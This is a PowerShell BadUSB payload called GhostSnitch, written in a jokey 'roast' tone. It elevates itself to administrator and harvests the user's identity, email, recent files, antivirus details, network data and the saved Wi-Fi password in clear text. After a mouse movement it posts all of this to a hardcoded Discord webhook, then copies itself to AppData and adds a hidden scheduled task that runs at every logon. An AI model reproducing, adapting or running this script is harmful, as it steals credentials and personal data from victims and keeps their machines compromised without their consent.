####################################################################################################
# Title       : GhostSnitch
# Version     : 1.2 (Stealth)
# Author      : I am TBJr
# Description : Curiosity was the spark, but roasting you is the flame. Now with stealth mode.
# Directory   : // badusb/Windows/GhostSnitch_Stego/GhostSnitch_Stego.txt
####################################################################################################

# Auto-elevate if not running as Administrator
If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
    [Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell -Verb runAs -ArgumentList "-ExecutionPolicy Bypass -File `\"$PSCommandPath`\""
    exit
}

function Get-FullName {
    try {
        $fullName = (net user $env:username | Select-String -Pattern "Full Name").ToString().Split(":")[1].Trim()
    } catch {
        $fullName = $env:username
    }
    return $fullName
}
$fullName = Get-FullName

function Get-UserInfo {
    return "User: $env:USERNAME on $env:COMPUTERNAME"
}

function Get-Email {
    try {
        $email = (gpresult /z | Select-String -Pattern "\S+@\S+").Matches.Value
        return "Email: $email"
    } catch {
        return "Email not found"
    }
}

function Get-OS {
    return (Get-CimInstance Win32_OperatingSystem).Caption
}

function Get-Uptime {
    $uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
    $timespan = New-TimeSpan -Start $uptime -End (Get-Date)
    return "Uptime: $($timespan.Days) days, $($timespan.Hours) hours"
}

function Get-DriveStats {
    $drives = Get-PSDrive -PSProvider FileSystem
    return ($drives | ForEach-Object {
        "$($_.Name): $([int]($_.Used/1GB))GB used / $([int]($_.Free/1GB))GB free"
    }) -join "`n"
}

function Get-RecentFiles {
    $recent = Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue |
            Sort-Object LastWriteTime -Descending | Select-Object -First 5
    return "Recent Files: " + ($recent | ForEach-Object { $_.Name }) -join ", "
}

function Get-USB {
    try {
        return (Get-PnpDevice -Class 'USB').FriendlyName -join ", "
    } catch {
        return "No USB info found"
    }
}

function Get-BitLocker {
    try {
        $status = Get-BitLockerVolume | Select-Object MountPoint, ProtectionStatus
        return ($status | ForEach-Object { "$($_.MountPoint): $($_.ProtectionStatus)" }) -join ", "
    } catch {
        return "BitLocker status unknown"
    }
}

function Get-NetworkInfo {
    $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias 'Wi-Fi' -ErrorAction SilentlyContinue | Where-Object {$_.IPAddress -notlike '169.*'}).IPAddress
    $mac = (Get-NetAdapter | Where-Object Status -eq 'Up').MacAddress
    return "Local IP: $ip, MAC: $mac"
}

function Get-Antivirus {
    try {
        $av = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntivirusProduct
        return ($av.displayName) -join ", "
    } catch {
        return "No antivirus info found"
    }
}

function Get-TopProcesses {
    $processes = Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 5
    return ($processes | ForEach-Object { "$($_.ProcessName): $([math]::Round($_.WorkingSet/1MB,1))MB" }) -join ", "
}

function Get-RAM {
    try {
        $RAM = (Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB
        $RAM = [int]$RAM
        if ($RAM -lt 4) {
            return "$RAM GB of RAM? This machine is powered by hopes and prayers."
        } elseif ($RAM -lt 8) {
            return "$RAM GB of RAM? Just enough to load your regrets."
        } elseif ($RAM -lt 16) {
            return "$RAM GB? Gamer vibes... if lag was a feature."
        } else {
            return "$RAM GB? Respect. But all muscle and no firewall? Hilarious."
        }
    } catch {
        return "Unable to detect RAM. Maybe the hamster escaped the wheel?"
    }
}

function Get-PubIP {
    try {
        $IP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content.Trim()
        return "Your public IP is $IP. Say hi to the world for me."
    } catch {
        return "Couldn't fetch your public IP. You're a ghost already."
    }
}

function Get-WifiPass {
    try {
        $ssid = (netsh wlan show interface | Select-String ' SSID ').ToString().Split(":")[1].Trim()
        $pass = (netsh wlan show profile name="$ssid" key=clear | Select-String 'Key Content').ToString().Split(":")[1].Trim()
        return "$ssid password: $pass"
    } catch {
        return "WiFi password not found"
    }
}

function Get-PasswordAge {
    try {
        $line = (net user $env:UserName | Select-String "Password last set").ToString()
        $dateStr = $line.Substring($line.IndexOf(":")+1).Trim()
        $days = (New-TimeSpan -Start $dateStr -End (Get-Date)).Days
        return "$days days since password last set"
    } catch {
        return "Password age unknown"
    }
}

function Send-ToDiscord {
    $webhook = 'https://discord.com/api/webhooks/1364536515954348032/3H6tkezlhYibD9CB6qAE62ON__BTvWcGEtuihmz7NylPZOhDYcjO0gq8BOuS-lLvDBBg'
    $payload = @{
        username = "👻 GhostSnitch Bot"
        content = "Stealth roast log for `$env:USERNAME"
        embeds = @(@{
            title = "GhostSnitch Report - Full Info"
            color = 65280
            fields = @(
                @{ name = "🧑‍💻 User Info"; value = (Get-UserInfo); inline = $true },
                @{ name = "📧 Email Roast"; value = (Get-Email); inline = $false },
                @{ name = "🖥️ OS"; value = (Get-OS); inline = $true },
                @{ name = "⏱️ Uptime"; value = (Get-Uptime); inline = $true },
                @{ name = "💽 Drives"; value = (Get-DriveStats); inline = $false },
                @{ name = "🗃️ Recent Files"; value = (Get-RecentFiles); inline = $false },
                @{ name = "🔌 USB Devices"; value = (Get-USB); inline = $false },
                @{ name = "🔐 BitLocker"; value = (Get-BitLocker); inline = $true },
                @{ name = "🌐 Network"; value = (Get-NetworkInfo); inline = $true },
                @{ name = "🛡️ Antivirus"; value = (Get-Antivirus); inline = $false },
                @{ name = "🔄 Top Processes"; value = (Get-TopProcesses); inline = $false },
                @{ name = "💾 RAM Roast"; value = (Get-RAM); inline = $true },
                @{ name = "🌍 Public IP"; value = (Get-PubIP); inline = $true },
                @{ name = "📶 WiFi Password"; value = (Get-WifiPass); inline = $false },
                @{ name = "🔒 Password Age"; value = (Get-PasswordAge); inline = $false }
            )
            timestamp = (Get-Date).ToString("o")
        })
    }
    Invoke-RestMethod -Uri $webhook -Method Post -Body (ConvertTo-Json $payload -Depth 10) -ContentType 'application/json'
}

# Wait for mouse move
Add-Type -AssemblyName System.Windows.Forms
$start = [System.Windows.Forms.Cursor]::Position
while ($true) {
    Start-Sleep -Seconds 2
    if ([System.Windows.Forms.Cursor]::Position.X -ne $start.X -or [System.Windows.Forms.Cursor]::Position.Y -ne $start.Y) {
        break
    }
}

# Send to Discord silently
Send-ToDiscord

# Persist in stealth mode
$dest = "$env:APPDATA\ghostsnitch.ps1"
Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $dest -Force
$task = "schtasks /create /f /sc onlogon /tn GhostSnitch /tr 'powershell -w h -NoP -NonI -Ep Bypass -File `\"$dest`\"'"
Invoke-Expression $task
